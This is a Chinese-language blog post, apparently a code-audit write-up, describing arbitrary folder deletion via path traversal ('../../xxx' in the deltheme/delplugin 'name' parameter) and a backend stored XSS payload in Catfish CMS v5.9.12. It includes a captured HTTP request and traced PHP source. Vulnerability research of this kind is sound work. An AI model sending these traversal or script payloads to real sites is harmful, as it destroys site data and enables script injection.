@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Catfish CMS v5.9.12任意文件夹删除漏洞 
+      
+      
+      |
+    
+     N0puple&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/001.ico">
+    <link rel="icon" href="/images/001.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">N0puple</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">朋友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Catfish CMS v5.9.12任意文件夹删除漏洞</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-07-26 22:08:45
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/php/" title="php">
+                    <b>#</b> php
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/catfish-cms/" title="catfish cms">
+                    <b>#</b> catfish cms
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" title="文件删除">
+                    <b>#</b> 文件删除
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在复现上一个 <code>cnvd</code> 漏洞的时候，碰巧挖了几个洞，在这里记录一下</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><code>v5.9.12</code> 以下，可能更新版本也有，不过没有下载到</p>
+<p>测试版本 <code>v5.9.12</code>，<code>v5.9.6</code></p>
+<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>需要登陆后台</p>
+<h4 id="两处任意文件删除"><a href="#两处任意文件删除" class="headerlink" title="两处任意文件删除"></a>两处任意文件删除</h4><p>上次分析了主题和插件的文件上传漏洞，虽然没有写代码的分析，但是本着学习的目的，也还是去看了代码，看代码的时候，看到下面有一个 <code>deltheme</code> 方法，我就在想，能不能实现删除任意文件夹，于是尝试了一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统设置 -&gt; 主题</span><br></pre></td></tr></table></figure>
+
+<p>在操作那里，有一个删除</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210726230627.png"></p>
+<p><code>burp</code> 抓包，可以看到</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/admin/Index/deltheme</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.catfish5912.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>57</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://www.catfish5912.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://www.catfish5912.com/index.php/admin/Index/themes.html</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=1ikft0um3chlrqivc5p83a4fa1; think_var=zh-cn</span><br><span class="line"></span><br><span class="line">name=blog&amp;verification=f7d7f36b00b4d8154053e82f4e2579f3</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，主题名字通过 <code>name</code> 传入，我们看到代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application&#x2F;admin&#x2F;controller&#x2F;Index.php</span><br></pre></td></tr></table></figure>
+
+<p>4311 行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deltheme</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkPermissions(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;verification())&#123;</span><br><span class="line">        <span class="variable">$tmpdir</span> = ROOT_PATH . <span class="string">&#x27;public&#x27;</span> . DS . Request::instance()-&gt;post(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deleteFolder(<span class="variable">$tmpdir</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先是一个 <code>$this-&gt;checkPermissions(3);</code> ，顾名思义，是一个检查权限的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPermissions</span>(<span class="params"><span class="variable">$permissions</span>, <span class="variable">$isjson</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;permissions &gt; <span class="variable">$permissions</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$isjson</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = [</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; Lang::get(<span class="string">&#x27;Your access rights are insufficient&#x27;</span>)</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(Lang::get(<span class="string">&#x27;Your access rights are insufficient&#x27;</span>));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意到传进来的数字参数，如果自己的 <code>permissions</code> 大于这个数，那么就进入下面报错的位置，否则就会返回 <code>true</code> ，调试可以看到，<code>admin</code> 的 <code>permissions</code> 值为 1，这个值应该就是权限的大小，数值越小，权限越大，这个 <code>permissions</code> 值得来源这里不做讨论，我们这里是满足条件的，那么就继续跟进，进入 <code>$this-&gt;verification()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">verification</span>(<span class="params"><span class="variable">$isGet</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$gever</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(Request::instance()-&gt;has(<span class="string">&#x27;verification&#x27;</span>,<span class="string">&#x27;post&#x27;</span>) &amp;&amp; <span class="variable">$isGet</span> == <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$gever</span> = Request::instance()-&gt;post(<span class="string">&#x27;verification&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(Request::instance()-&gt;has(<span class="string">&#x27;verification&#x27;</span>,<span class="string">&#x27;get&#x27;</span>) &amp;&amp; <span class="variable">$isGet</span> == <span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$gever</span> = Request::instance()-&gt;get(<span class="string">&#x27;verification&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$gever</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$verification</span> = <span class="keyword">$this</span>-&gt;getver();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$gever</span> == md5(<span class="variable">$verification</span>.<span class="keyword">$this</span>-&gt;getUser()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面几句就是有没有 <code>post</code> 或者 <code>get</code> 一个 <code>verification</code> ，根据上面的 <code>http</code> 请求，我们是有的，存在，那我们就会 <code>$verification = $this-&gt;getver();</code> ，<code>getver</code> 方法就是从 <code>cache</code> 中获取到 <code>random_verification</code>  然后就会进行比较 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gever</span> == md5(<span class="variable">$verification</span>.<span class="keyword">$this</span>-&gt;getUser())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Session::get(<span class="keyword">$this</span>-&gt;session_prefix.<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这实际上就是一个认证的过程，认证成功才会去进行删除操作，接下来就会构造文件夹路径</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tmpdir</span> = ROOT_PATH . <span class="string">&#x27;public&#x27;</span> . DS . Request::instance()-&gt;post(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;deleteFolder(<span class="variable">$tmpdir</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们来看看 <code>post</code> 的 <code>name</code> 的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catfish&#x2F;library&#x2F;think&#x2F;Request.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;post)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;post = <span class="variable">$_POST</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param       = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;post = array_merge(<span class="keyword">$this</span>-&gt;post, <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先获取到 <code>POST</code> 的数据，<code>$name</code> 的值为传进来的 <code>name</code>，不是 <code>array</code> 进入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_object(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        reset(<span class="variable">$data</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$data</code> 是我们 <code>post</code> 进来的值，上面主要是对 <code>name</code> 进行操作，来到这里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很容易得到 <code>$data = $data[&#39;name&#39;]</code> ，也就是我们传进去的主题的 <code>name</code> ，然后这里的 <code>filter</code> 是没有值的，因此也产生不了影响，所以最后返回的 <code>$data</code> 也就是我们传进去的 <code>name</code> ，并且没有任何过滤，最后来到 <code>$this-&gt;deleteFolder($tmpdir);</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteFolder</span>(<span class="params"><span class="variable">$folder</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;delFolder(<span class="variable">$folder</span>);</span><br><span class="line">    <span class="keyword">if</span>(is_dir(<span class="variable">$folder</span>))&#123;</span><br><span class="line">        @rmdir(<span class="variable">$folder</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先进入 <code>$this-&gt;delFolder($folder);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">delFolder</span>(<span class="params"><span class="variable">$folder</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_dir(<span class="variable">$folder</span>))&#123;</span><br><span class="line">        <span class="variable">$fd</span> = scandir(<span class="variable">$folder</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$fd</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$val</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$val</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="variable">$folder</span>.DS.<span class="variable">$val</span>;</span><br><span class="line">                <span class="keyword">if</span>(is_dir(<span class="variable">$tmp</span>))&#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;delFolder(<span class="variable">$tmp</span>);</span><br><span class="line">                    @rmdir(<span class="variable">$tmp</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        @unlink(<span class="variable">$folder</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里很简单，扫描整个文件夹并删除，最后也是直接就删除，因此我们可以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;xxx</span><br></pre></td></tr></table></figure>
+
+<p>来删除任意有权限删除的文件夹</p>
+<p>还有一处也是一样，位于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application&#x2F;admin&#x2F;controller&#x2F;Index.php</span><br></pre></td></tr></table></figure>
+
+<p>4362行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delplugin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkPermissions(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;verification())&#123;</span><br><span class="line">        <span class="variable">$tmpdir</span> = APP_PATH . <span class="string">&#x27;plugins&#x27;</span> . DS . Request::instance()-&gt;post(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deleteFolder(<span class="variable">$tmpdir</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理是一样的，就不多赘述了</p>
+<h4 id="存储型-xss"><a href="#存储型-xss" class="headerlink" title="存储型 xss"></a>存储型 xss</h4><p>实际上比较鸡肋啦，毕竟是后台 <code>XSS</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统设置 -&gt; 网站信息 -&gt; 统计代码</span><br></pre></td></tr></table></figure>
+
+<p>在最下方统计代码处，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;textarea&gt;&lt;script&gt;alert(&quot;aa&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>保存刷新</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210726214921.png"></p>
